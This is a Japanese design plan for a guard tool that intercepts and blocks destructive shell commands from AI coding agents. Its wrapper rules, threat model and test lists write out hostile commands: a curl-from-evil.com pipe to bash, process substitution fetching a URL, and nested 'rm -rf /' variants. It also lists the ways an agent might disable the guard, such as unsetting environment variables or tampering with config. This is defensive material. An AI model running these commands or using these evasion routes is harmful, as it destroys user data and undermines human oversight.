# 実装プラン: #30 Recursive Unwrap Stack (v0.6.0)

## 概要

Layer 2 (hooks) の検知を substring match から Recursive Unwrap Stack に進化させる。
shell wrapper (sudo, env, bash -c 等) を再帰的に剥がして本体コマンドを露出させ、
Layer 1 と同じ `CommandInvocation` + `match_rule()` で評価する。

副次目標として、Claude Code hook (shell) と Cursor hook (Rust) の実装二重化を解消する。

## 非機能要件（合意済み）

| 項目 | 要件 | 優先度 |
|------|------|--------|
| 性能 | hook-check 呼び出し p95 < 10ms（プロセス spawn 含む） | 高 |
| セキュリティ | 全失敗モードで fail-close（block）。fail-open 禁止 | 高 |
| 互換性 | 既存 config.toml のルール定義変更ゼロ。後方互換 | 高 |
| 保守性 | 各コンポーネント独立テスト可能。Layer 1/2 でコード共有 | 高 |
| コスト | 新規依存は shell-words (zero-dep) のみ | 中 |

## 技術選定

| 技術/ライブラリ | 選定理由 | 代替案 |
|---------------|---------|--------|
| `shell-words` v1.1 | zero-dep, POSIX準拠, simpler API (`split()` → `Vec<String>`) | `shlex` — richer だが不要な機能が多い。自前実装 — クォートバグリスク高 |

## 設計方針

### アーキテクチャ: Approach C（Rust一元化）

hook script を thin wrapper にして `omamori hook-check` サブコマンドに委譲。
全パース・評価ロジックは Rust で一元化。

```
Claude Code hook script (thin wrapper):
  #!/bin/sh
  INPUT="$(cat)"
  echo "$INPUT" | omamori hook-check --provider claude-code
  exit $?

Cursor hook:
  既存の run_cursor_hook() が内部的に同じ parse_command_string() を呼ぶ
```

**理由**:
- Claude Code (shell) と Cursor (Rust) の実装二重化を解消（QA 最重要指摘）
- Layer 1 の `CommandInvocation` + `match_rule()` を再利用（Architect 提案）
- テスタビリティ最大化（全ロジックが Rust unit test 可能）

### 2段階チェック

```
Phase 1: Meta-Pattern Check（string-level, 既存維持）
  - env var unset (CLAUDECODE, CURSOR_AGENT 等)
  - config tamper (omamori config disable 等)
  - integrity.json 操作
  - /bin/rm 等の直接パス指定
  → 一致したら即 BLOCK（exit 2）

Phase 2: Token-level Unwrap Stack（新規）
  - トークン化 → compound split → unwrap → match_rule()
  → 一致したら BLOCK（exit 2）
  → 不一致なら ALLOW（exit 0）
```

**Meta-pattern を string-level で残す理由**: `unset CLAUDECODE` は echo 内でもブロックすべき設計判断。
これは false positive ではなく、意図的な broad match（Architect 指摘）。

### Recursive Unwrap Stack のフロー

```
parse_command_string(input: &str, depth: u8) -> Vec<CommandInvocation>

1. 入力長チェック（> MAX_INPUT_BYTES → fail-close）
2. compound operator pre-split: `&&`, `||`, `;` を空白境界外でも検出（`a&&b` → `a && b`）
   改行・バックスラッシュ継続も正規化
3. shell_words::split(normalized)
   → Err → fail-close（unclosed quote 等）
   → tokens > MAX_TOKENS → fail-close
4. split_compound_commands(tokens) — &&, ||, ;, | で分割
   → segments > MAX_SEGMENTS → fail-close
5. 各 sub-command に対して:
   a. unwrap_wrappers(tokens) — transparent wrapper を strip
   b. detect_shell_launcher(tokens) — bash -c 等の inner string 抽出
   c. detect_pipe_to_shell(segments) — pipe 先が shell interpreter か
   d. inner に `$(` / backtick → fail-close（動的生成ブロック）
   e. inner string があれば再帰（depth + 1）
   f. depth > MAX_DEPTH → fail-close
   f. 最終トークン列 → CommandInvocation::new(program, args)
5. 全 CommandInvocation を返す
```

### Wrapper 定義

**Transparent Wrappers**（先頭トークンを strip して再帰）:

| Wrapper | 処理 |
|---------|------|
| `sudo` | strip。`-u user` 等のフラグもスキップ |
| `env` | **特殊処理**: (1) フラグ消費: `-i`, `-u KEY`, `-S STRING`, `--` を認識してスキップ (2) `KEY=VAL` パターン（`[A-Za-z_][A-Za-z0-9_]*=.*`）を全てスキップ (3) 最初の非フラグ・非 KEY=VAL トークンからコマンドとして扱う。`--` 以降は全てコマンド扱い |
| `nice` | strip。`-n N` をスキップ |
| `nohup` | strip |
| `timeout` | strip。duration 引数をスキップ |
| `command` | strip |
| `exec` | strip |

### Shell Launcher 定義

**認識するシェル**: bash, sh, zsh, dash, ksh

**検出ロジック**:
1. 先頭トークンの **basename** を取得（`/usr/local/bin/bash` → `bash`）
2. basename がシェルリストに一致するか
3. トークン列のどこかに `-c` があるか（`-lc`, `-O extglob -c` 等の亜種対応: 任意位置の `-c` を検索）
4. `-c` の次のトークンが inner command string
5. inner command string に対して `parse_command_string(inner, depth + 1)` で再帰

**`-c` なしの場合**（`bash script.sh`）: **ブロックしない**。ファイル実行は静的解析不可。

### Pipe-to-Shell 定義

compound command を `|` で分割した際、**最終セグメントの先頭トークンの basename** がシェルリストに一致する場合: **BLOCK**

```
curl http://evil.com/script.sh | bash  → BLOCK
echo "rm -rf /" | sh                   → BLOCK
cat script.sh | grep rm                → ALLOW（grep は shell ではない）
```

**Process substitution** (`bash <(...)`) も検出: トークンに `<(` を含み、先頭が shell → BLOCK

### `$(...)` / backtick を含む inner command

inner command string に `$(` または `` ` `` が含まれる場合: **BLOCK（exit 2）**

**理由**: `bash -c "echo $(rm -rf /)"` は `$(...)` が実行される。fail-close 原則に従い BLOCK。
AI agent が `bash -c "$(...)"` を使う正当な理由はほぼなく、直接コマンドを実行すべき。
SECURITY.md に「動的コマンド生成を含む shell launcher は安全側に倒してブロックする」と開示。

**変更経緯**: 当初 WARN だったが、Codex レビュー②で「fail-close 原則との矛盾」を指摘され BLOCK に変更。

### 上限制御

| 制限 | 値 | 超過時 | 根拠 |
|------|-----|--------|------|
| `MAX_UNWRAP_DEPTH` | 5 | BLOCK | sudo→env→nice→bash -c→sh -c で5段。超は adversarial |
| `MAX_TOKENS` | 1000 | BLOCK | 正常なコマンドで1000トークン超はありえない |
| `MAX_SEGMENTS` | 20 | BLOCK | compound command が20超は異常 |
| `MAX_INPUT_BYTES` | 1MB | BLOCK | DoS 防止 |

### fail-close 失敗分類表（Codex レビュー① 指摘対応）

| 失敗モード | 挙動 | 理由 |
|-----------|------|------|
| shell_words::split() エラー（unclosed quote 等） | BLOCK | パースできない入力は危険と推定 |
| 再帰深度超過 (> 5) | BLOCK | adversarial nesting |
| トークン数超過 (> 1000) | BLOCK | 正常コマンドで超えない |
| セグメント数超過 (> 20) | BLOCK | compound 20超は異常 |
| 入力長超過 (> 1MB) | BLOCK | DoS 防止 |
| inner に `$(...)` / backtick | BLOCK | 動的生成は実行される。fail-close |
| UTF-8 不正 | BLOCK | 正常なコマンドは valid UTF-8 |
| 空入力 | ALLOW | 空コマンドは無害 |
| トークン 0 個（空白のみ） | ALLOW | 同上 |
| OOM / panic | fail-close（`panic=abort` + exit code 非ゼロ = AI tool がブロック扱い） | 安全側に倒す |

### Exit Code 契約

| Exit Code | 意味 | 用途 |
|-----------|------|------|
| 0 | ALLOW | コマンド実行を許可 |
| 2 | BLOCK | コマンド実行をブロック |
| 非ゼロ (2以外) | fail-close BLOCK | パースエラー、panic 等の内部エラー |

**テストで固定**: 全失敗モードで exit code が 0 にならないことを CI で検証。

### hook-check の悪用耐性（Codex レビュー① 指摘対応）

`omamori hook-check` は trusted caller を前提としない設計:
- stdin からコマンド文字列を受け取り、exit code で結果を返すだけ
- どの経路から呼ばれても fail-close
- AI agent が直接 `omamori hook-check` を呼んでも、結果は「ブロックすべきか否か」の判定のみ。hook-check 自体が副作用を持たない

### メッセージ設計（UX 分析反映）

**デフォルト（1行）**:
```
omamori hook: blocked — rm -rf / (via bash -c)
```

**OMAMORI_VERBOSE=1 時**:
```
omamori hook: blocked — rm -rf /
  chain: sudo → env → bash -c → rm -rf /
  rule: rm-recursive-to-trash (escalated to block in hook)
```

**block 時の hint（1行追加）**:
```
  hint: if intentional, run the command directly in your terminal (not via AI agent)
```

**override は広告しない**（AI agent が試みるリスクがあるため）。

### Audit Event 拡張（#29 連携）

```rust
pub struct AuditEvent {
    // 既存フィールド...
    pub unwrap_chain: Option<Vec<String>>,  // ["sudo", "env", "bash -c", "rm -rf /"]
    pub detection_layer: String,            // "layer1" or "layer2"
    pub raw_input_hash: Option<String>,     // SHA-256 of original input (否認防止)
}
```

### omamori status 拡張

```
Detection:
  [ok]   Layer 1 (PATH shim)            7 rules active, 3 detectors configured
  [ok]   Layer 2 (hooks)                Token-aware parser active
  [info] Layer 2 coverage               Claude Code + Cursor
```

## オーケストレーターの判断記録

| 判断 | 何を決めたか | なぜ | 何を捨てたか |
|------|------------|------|------------|
| GO（Market CONDITIONAL GO を override） | #30 実装する | warn→block 昇格は omamori core value (fail-close) に直結。FP テスト事前構築で条件充足 | 「HN 反応が弱いから延期」という選択肢 |
| 深度上限 5 | Security の 10 ではなく 5 | 5段超は adversarial 意図明確。寛容にする理由がない | Security の「10が安全」という提案 |
| pipe-to-shell 無条件 BLOCK | QA の FP 懸念より Security の安全優先 | AI agent context で `cmd \| bash` の正当用途はほぼゼロ | QA の「FP リスクに注意」という慎重論 |
| `$(...)` 含む inner は BLOCK | Codex②で WARN→BLOCK に変更。`$(rm -rf /)` は実行される。fail-close 原則 | FP 許容の WARN 案 |
| meta-pattern は string-level 維持 | token-level に移行しない | `unset CLAUDECODE` は echo 内でもブロックすべき意図的設計 | 「全てを token-level に統一」という美しい設計 |
| fish は対象外 | シェルリストに含めない | 実用頻度が低い。corpus-driven で追加する方針 | 「網羅的にする」という完璧主義 |

## 実装ステップ（概要レベル）

1. [ ] `shell-words` を Cargo.toml に追加
2. [ ] `src/unwrap.rs` — parse_command_string() + 各コンポーネント実装
3. [ ] `omamori hook-check` サブコマンド追加（lib.rs）
4. [ ] `render_hook_script()` を thin wrapper に変更（installer.rs）
5. [ ] `run_cursor_hook()` を parse_command_string() 経由に変更（lib.rs）
6. [ ] テスト: unit tests (unwrap.rs) + 既存テスト移行 + bypass corpus 拡張
7. [ ] SECURITY.md 更新（KNOWN_LIMIT 追記、シェルリスト開示）
8. [ ] README.md 更新（検知エンジンの説明追加）
9. [ ] バージョン bump → v0.6.0

※詳細タスク分解は /develop Phase 2 で実施

## やらないこと（スコープ外）

- full AST parsing (tree-sitter) — omamori の threat model に対して過剰
- variable expansion (`$CMD`) / eval resolution — 静的解析の構造的限界
- base64/hex decode — 際限なく複雑化する
- heredoc parsing — 実用頻度低い
- fish / nushell 対応 — corpus-driven で将来追加
- audit log hash chain (#29) — 別 issue
- `omamori status` の大幅 UI 変更 — Detection セクション追加のみ
- property-based testing (proptest) — 価値はあるが v0.6.0 スコープでは optional

## ファイル変更予定

| ファイル | 変更内容 |
|---------|---------|
| `Cargo.toml` | `shell-words = "1.1"` 追加 |
| `src/unwrap.rs` | **新規**: parse_command_string(), split_compound, unwrap_wrappers, detect_shell_launcher, detect_pipe_to_shell |
| `src/lib.rs` | hook-check サブコマンド追加、run_cursor_hook() 改修 |
| `src/installer.rs` | render_hook_script() thin wrapper 化、blocked_command_patterns() はmeta-pattern用に維持 |
| `src/audit.rs` | AuditEvent に unwrap_chain, detection_layer, raw_input_hash 追加 |
| `tests/` | unwrap unit tests, bypass corpus 拡張, 既存テスト移行 |
| `SECURITY.md` | KNOWN_LIMIT 追記（静的解析限界、シェルリスト） |
| `README.md` | 検知エンジン説明追加 |
| `CHANGELOG.md` | v0.6.0 エントリ |

## リスクと対策

| リスク | 影響度 | 対策 |
|-------|-------|------|
| `env NODE_ENV=production npm start` FP | 高 | env unwrap に KEY=VAL スキップ文法を仕様化。テストファーストで先に書く |
| プロセス spawn コスト増 (2-5ms) | 中 | 10ms budget 内。CI でベンチマーク計測 |
| 既存テスト破壊 | 中 | 既存テストを先に移行してから実装変更 |
| shell-words の unclosed quote 挙動 | 中 | fail-close で対応。テストで確認 |
| `-lc` 等のシェルフラグ亜種見落とし | 中 | 任意位置の `-c` 検索。主要亜種をテストケースに追加 |
| hook-check が直接呼ばれる | 低 | trusted caller 不要設計。副作用なし、判定のみ |

## 成功指標

- [ ] `sudo env bash -c "rm -rf /"` が BLOCK される（現行: 素通り）
- [ ] `bash -c "rm -rf /"` が BLOCK される（現行: warn-only, exit 0）
- [ ] `/usr/local/bin/bash -c "rm -rf /"` が BLOCK される（現行: 素通り）
- [ ] `curl ... | bash` が BLOCK される（現行: 素通り）
- [ ] `echo "rm -rf" > memo.txt` が ALLOW される（FP 解消）
- [ ] `env NODE_ENV=production npm start` が ALLOW される（FP なし）
- [ ] `bash script.sh` が ALLOW される（-c なしは素通り）
- [ ] 既存 bypass corpus テスト全 PASS（回帰ゼロ）
- [ ] `bash -c "echo $(rm -rf /)"` が BLOCK される（dynamic generation）
- [ ] hook-check 応答時間 p95 < 10ms
- [ ] 深度 6 の nested command が BLOCK される（fail-close）
- [ ] トークン 1001 個の入力が BLOCK される（fail-close）
- [ ] unclosed quote 入力が BLOCK される（fail-close）
- [ ] `a&&rm -rf /`（無空白 compound）が BLOCK される
- [ ] 全失敗モードで exit code != 0（CI 検証）

## 調査・レビュー結果（/develop への申し送り）

### Codex レビュー① 結果
- 指摘 5 件: High 2 件（hook-check 悪用耐性、fail-close 範囲）、Medium 2 件（env 規則、-c 亜種）、Low 1 件
- 全件対応済み（プランに反映）
- ループ回数: 0（差し戻しなし）

### Codex レビュー② 結果
- 指摘 5+4 件: High 3 件（$(...)BLOCK化、meta-pattern矛盾指摘※却下、compound pre-split）、Medium 2 件（上限制御、pipe-to-shell明文化）
- High 1 件却下（meta-pattern vs echo は矛盾なし。Phase 1/Phase 2 は別チェック層）
- 残り全件対応済み（Phase 6 でプラン修正）
- 設計巻き戻し: なし

### QA Shift-left 結果

#### 重点検証ポイント
- [ ] `env NODE_ENV=production npm start` が通ること（最重要 FP テスト）
- [ ] `sudo apt install git` が通ること
- [ ] `bash script.sh` (-c なし) が通ること
- [ ] shell-words の unclosed quote が fail-close すること
- [ ] 再帰深度 6 が fail-close すること
- [ ] 入力 2MB が fail-close すること

#### 想定エッジケース（テスト化必須）
- `env -i rm -rf /` → BLOCK
- `env TERM=xterm sudo rm -rf /` → BLOCK
- `bash -c "bash -c \"rm -rf /\""` → BLOCK（nested）
- `bash --norc -c "rm -rf /"` → BLOCK（-c 亜種）
- `echo ok && rm -rf /` → BLOCK（compound）
- `bash -c "$(echo test)"` → BLOCK（dynamic generation, fail-close）
- `bash -c "echo $(rm -rf /)"` → BLOCK（`$(...)` 内が実行される）
- `a&&rm -rf /` → BLOCK（無空白 compound）
- `bash <(curl url)` → BLOCK（process substitution）

### Security Threat Model 結果

#### 保護対象
| 資産 | 重要度 |
|------|--------|
| ユーザーのファイルシステム | Critical |
| Git リポジトリ状態 | Critical |
| omamori 自身の防御層 | Critical |
| Layer 2 検知精度 | High |

#### 主要脅威と対策
| 脅威 | DREAD | 対策 |
|------|-------|------|
| T3: フルパスシェル未認識 | 9.0 | basename matching |
| T8: base64 obfuscation | 8.8 | KNOWN_LIMIT。構造的限界 |
| T4: 非標準シェル | 8.2 | シェルリスト: bash,sh,zsh,dash,ksh |
| T2: 再帰爆発 | 8.0 | MAX_DEPTH=5, fail-close |
| T10: exec prefix | 8.0 | wrapper リストに追加 |
| T6: backslash escaping | 7.8 | shell-words が処理 |
| T5: pipe-to-shell | 7.6 | 無条件 BLOCK |
| T11: process substitution | 7.4 | `<(` 検出 → BLOCK |
| T12: binary tamper | 7.0 | 既存 canary でカバー |
| T9: 巨大入力 DoS | 6.4 | 入力長上限 1MB |
| T13: audit 否認 | 5.5 | raw_input_hash |
| T7: 情報漏洩 | 5.0 | メッセージ統一 |

#### セキュリティ要件（/develop への申し送り）
- [ ] 全失敗モードで fail-close（失敗分類表に基づく）
- [ ] basename matching でフルパスシェル対応
- [ ] シェルリスト: bash, sh, zsh, dash, ksh
- [ ] exec を wrapper リストに追加
- [ ] pipe-to-shell 無条件 BLOCK
- [ ] `<(` process substitution → BLOCK
- [ ] `$(...)` / backtick inner → BLOCK
- [ ] 入力長上限 1MB
- [ ] hook-check は trusted caller 不要でも fail-close
- [ ] エラーメッセージで内部パーサー状態を非漏洩
- [ ] SECURITY.md KNOWN_LIMIT 更新

#### 残存リスク
| リスク | 受容理由 |
|--------|---------|
| base64/variable indirection（`$(...)` 外） | 静的解析の構造的限界。#14 MCP で対応 |
| fish/nushell | 実用頻度低。corpus-driven で追加 |
| `bash script.sh` の内容 | -c なしファイル実行は静的解析不可 |
| pipe-to-shell FP | AI context で正当用途ほぼゼロ |

### UX 分析結果

#### メッセージ設計
- デフォルト 1 行: `omamori hook: blocked — {command} (via {wrapper})`
- `OMAMORI_VERBOSE=1` で full chain + rule name
- block 時 hint: "run directly in your terminal"
- override は広告しない

#### 情報設計
- `omamori status` に Detection セクション追加
- audit event に unwrap_chain, detection_layer, raw_input_hash

### Market Research 結果

#### 判定
- **オーケストレーター判定**: GO（Market の CONDITIONAL GO を override）
- **差別化**: 「bash -c が検知できる」ではなく「tamper-resistant な block ができる」
- **主要競合**: dcg（AST-based 先行）、Rampart（YAML policy + LLM verify）
- **プラットフォームリスク**: 中（Anthropic guardrails ロードマップ）
- **Why Now**: AI agent 事故蓄積 + 市場立ち上がり期

## 修正履歴

| 日付 | フェーズ | 修正内容 | 理由 |
|------|---------|---------|------|
| 2026-03-22 | Phase 4 初版 | プラン作成 | 5 agent 調査 + Codex レビュー① 統合 |
| 2026-03-22 | Phase 6 修正 | `$(...)` WARN→BLOCK、上限制御追加(MAX_TOKENS/SEGMENTS)、env亜種仕様追記、compound pre-split追加、exit code契約追加、性能p95化 | Codex レビュー② 指摘対応 |
